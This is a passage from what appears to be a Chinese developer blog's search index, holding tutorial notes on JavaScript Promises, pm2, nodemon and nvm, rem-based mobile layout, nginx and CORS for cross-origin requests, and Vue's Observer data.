punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><p>带有业务的封装：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> ajax <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>ajax<span class="token punctuation">.</span><span class="token keyword">get</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>url<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> reject<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> oReq <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    oReq<span class="token punctuation">.</span>onload <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">// callback(this.responseText)</span>      <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>responseText<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    oReq<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"get"</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    oReq<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">duquabc</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> reject<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> ret <span class="token operator">=</span> <span class="token string">''</span>    ajax<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'./data/a.txt'</span><span class="token punctuation">)</span>      <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>data <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      ret <span class="token operator">+</span><span class="token operator">=</span> data      <span class="token keyword">return</span> ajax<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'./data/b.txt'</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>      <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>data <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      ret <span class="token operator">+</span><span class="token operator">=</span> data      <span class="token keyword">return</span> ajax<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'./data/c.txt'</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>      <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>data <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      ret <span class="token operator">+</span><span class="token operator">=</span> data      <span class="token function">resolve</span><span class="token punctuation">(</span>ret<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token function">duquabc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>ret <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><h6 id="错误处理-1"><a href="#错误处理-1" class="headerlink" title="错误处理"></a>错误处理</h6><ul><li>then 方法的第二个参数<ul><li>仅捕获 Promise 本身的异常</li></ul></li><li>catch 方法（推荐）<ul><li>不仅可以捕获 Promise 的异常</li><li>还是可以捕获 resolve 函数中的异常</li><li>如果后面还有 then 无法阻止</li></ul></li><li>then 方法无法被阻止</li></ul><h6 id="Promise-all"><a href="#Promise-all" class="headerlink" title="Promise.all()"></a>Promise.all()</h6><h6 id="Promise-race"><a href="#Promise-race" class="headerlink" title="Promise.race()"></a>Promise.race()</h6><h4 id="Async-函数"><a href="#Async-函数" class="headerlink" title="Async 函数"></a>Async 函数</h4><h2 id="第15章-部署与运维"><a href="#第15章-部署与运维" class="headerlink" title="第15章 部署与运维"></a>第15章 部署与运维</h2><ul><li><a href="https://www.imooc.com/learn/1004" target="_blank" rel="noopener">项目上线流程</a></li><li><a href="https://coding.imooc.com/class/95.html" target="_blank" rel="noopener">Node.js线上服务器部署与发布</a></li></ul><h4 id="主机"><a href="#主机" class="headerlink" title="主机"></a>主机</h4><h4 id="域名-1"><a href="#域名-1" class="headerlink" title="域名"></a>域名</h4><h4 id="发布"><a href="#发布" class="headerlink" title="发布"></a>发布</h4><h4 id="pm2"><a href="#pm2" class="headerlink" title="pm2"></a>pm2</h4><p>安装</p><pre class=" language-bash"><code class="language-bash">yarn global add pm2<span class="token comment" spellcheck="true">## 或者</span><span class="token function">npm</span> <span class="token function">install</span> pm2 -g</code></pre><p>常用命令</p><pre class=" language-bash"><code class="language-bash">pm2 start apppm2 <span class="token function">ls</span>pm2 delete xxxpm2 stop apppm2 restart app</code></pre><h4 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h4><h4 id="持续集成"><a href="#持续集成" class="headerlink" title="持续集成"></a>持续集成</h4><h2 id="第16章-其他"><a href="#第16章-其他" class="headerlink" title="第16章 其他"></a>第16章 其他</h2><h4 id="Node-js-最佳实践"><a href="#Node-js-最佳实践" class="headerlink" title="Node.js 最佳实践"></a>Node.js 最佳实践</h4><ul><li><a href="https://github.com/i0natan/nodebestpractices" target="_blank" rel="noopener">https://github.com/i0natan/nodebestpractices</a></li></ul><h4 id="Node-面试资源"><a href="#Node-面试资源" class="headerlink" title="Node 面试资源"></a>Node 面试资源</h4><ul><li><a href="https://github.com/ElemeFE/node-interview" target="_blank" rel="noopener">ElemeFE / node-interview</a></li></ul><h4 id="nodemon-1"><a href="#nodemon-1" class="headerlink" title="nodemon"></a>nodemon</h4><p>在开发过程中，每次修改完代码手动重启服务器很麻烦。这里我们可以使用一个第三方命令行工具：<a href="https://github.com/remy/nodemon" target="_blank" rel="noopener">nodemon</a> 来帮我们解决这个问题。</p><p><code>nodemon</code> 是一个基于Node.js 开发的一个第三方命令行工具，使用它的第一步就是先安装：</p><pre class=" language-shell"><code class="language-shell">npm install --global nodemon</code></pre><p>基本使用：</p><pre class=" language-shell"><code class="language-shell">nodemon app.js</code></pre><p>只要是通过 <code>nodemon app.js</code> 启动的服务，则它会监视你的文件变化， 当文件发生变化的时候，自动帮你重启服务器。</p><blockquote><p>注意：该工具仅用于开发测试，不要在生产服务器中使用该命令。</p></blockquote><hr><h4 id="使用-nvm-安装管理-Node"><a href="#使用-nvm-安装管理-Node" class="headerlink" title="使用 nvm 安装管理 Node"></a>使用 nvm 安装管理 Node</h4><p>安装</p><ul><li>macOS：<a href="https://github.com/creationix/nvm" target="_blank" rel="noopener">https://github.com/creationix/nvm</a></li><li>Linux：<a href="https://github.com/creationix/nvm" target="_blank" rel="noopener">https://github.com/creationix/nvm</a></li><li>Windows：<a href="https://github.com/coreybutler/nvm-windows" target="_blank" rel="noopener">https://github.com/coreybutler/nvm-windows</a></li></ul><p>配置</p><pre class=" language-bash"><code class="language-bash">nvm node_mirror http://npm.taobao.org/mirrors/nodenvm npm_mirror https://npm.taobao.org/mirrors/npm/</code></pre><p>常用命令</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">## 查看已安装列表</span>nvm list<span class="token comment" spellcheck="true">## 安装指定版本</span>nvm <span class="token function">install</span> <span class="token operator">&lt;</span>version<span class="token operator">></span><span class="token comment" spellcheck="true">## 卸载指定版本</span>nvm uninstall <span class="token operator">&lt;</span>version<span class="token operator">></span><span class="token comment" spellcheck="true">## 切换版本</span>nvm use <span class="token operator">&lt;</span>version<span class="token operator">></span></code></pre><h4 id="JavaScript-代码规范"><a href="#JavaScript-代码规范" class="headerlink" title="JavaScript 代码规范"></a>JavaScript 代码规范</h4><ul><li><a href="https://github.com/standard/standard" target="_blank" rel="noopener">JavaScript Standard Style</a></li><li><a href="https://github.com/airbnb/javascript" target="_blank" rel="noopener">Airbnb JavaScript Style Guide</a></li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> node </category>
          
      </categories>
      
      
        <tags>
            
            <tag> node </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>APP适配问题</title>
      <link href="/2019/08/29/app/app/"/>
      <url>/2019/08/29/app/app/</url>
      
        <content type="html"><![CDATA[<h2 id="APP适配问题"><a href="#APP适配问题" class="headerlink" title="APP适配问题"></a>APP适配问题</h2><p>用rem处理适配</p><ol><li>设计稿的尺寸需要转化为rem值，分为若干份，没一份的大小就是rem，一般分为20来计算</li><li>把设计图测量出来的尺寸转化为rem值   比如：设计稿中一张图片是200px*200px</li><li>在不同的设备中我们只需要去动态的设置html的font-size=设置宽度/20</li><li>这里动态的改变html中的font-size我们用js写，媒体查询比较麻烦</li></ol><pre><code>&lt;script type="text/javascript"&gt;       window.onresize=function(){           document.querySelector('html').style.fontSize=window.screen.width/20+'px';       }           onresize();&lt;/script&gt;</code></pre><p><strong>这里要放在body的上面</strong></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 移动端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 移动端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nginx解决跨域问题</title>
      <link href="/2019/08/28/nginx/nginx/"/>
      <url>/2019/08/28/nginx/nginx/</url>
      
        <content type="html"><![CDATA[<h2 id="nginx解决跨域问题"><a href="#nginx解决跨域问题" class="headerlink" title="nginx解决跨域问题"></a>nginx解决跨域问题</h2><p>作为前端的小白们，遇到跨域是不是很头疼的事情，在这里我介绍两种常用的方法</p><h3 id="方法一-nginx反向代理"><a href="#方法一-nginx反向代理" class="headerlink" title="方法一 nginx反向代理"></a>方法一 nginx反向代理</h3><p><img src="https://img-blog.csdnimg.cn/20190311111551133.png" alt=""></p><ol><li>首先你把下载nginx  传送门 <a href="http://nginx.org/en/download.html" target="_blank" rel="noopener">nginx</a></li><li>打开命令工具 开启nginx命令：start nginx</li><li>关闭nginx命令：./nginx.exe -s stop</li><li>然后打开conf-&gt;nginx.conf 会看到下面的配置<br><img src="https://img-blog.csdnimg.cn/201903111110196.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTUyODU4Nw==,size_16,color_FFFFFF,t_70" alt=""></li></ol><h3 id="方法二-cors"><a href="#方法二-cors" class="headerlink" title="方法二 cors"></a>方法二 cors</h3><ol><li><p>CORS背后的基本思想是使用自定义的HTTP头部允许浏览器和服务器相互了解对方，从而决定请求或响应成功与否</p></li><li><p>后台配置请求头 把前端的ip放在白名单中  这里用的是node.js</p><p><img src="https://img-blog.csdnimg.cn/20190311112141674.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTUyODU4Nw==,size_16,color_FFFFFF,t_70" alt=""></p><p>这里记录一下前端如何写</p><p><img src="https://img-blog.csdnimg.cn/20190311112315973.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTUyODU4Nw==,size_16,color_FFFFFF,t_70" alt=""></p></li></ol><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> nginx </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vue中Observer问题</title>
      <link href="/2019/08/28/vue/vue/"/>
      <url>/2019/08/28/vue/vue/</url>
      
        <content type="html"><![CDATA[<h2 id="vue-中-ob-Observer-问题"><a href="#vue-中-ob-Observer-问题" class="headerlink" title="vue 中 [ob: Observer]问题"></a>vue 中 [<strong>ob</strong>: Observer]问题</h2><p>​​​​<br><img src="/images/vue.png" alt="截图"></p><p>– <strong>ob</strong>: Observer这些数据是vue这个框架对数据设置的监控器，一般都是不可枚举的。<br>首先我们要把这个数据获取原始数据 <strong>JSON.stringify([data])</strong>   变成字符串</p><p>然后在用<strong>JSON.parse()</strong>将数据转换为 JavaScript 对象<br><img src="https://img-blog.csdnimg.cn/20190313104254672.png" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
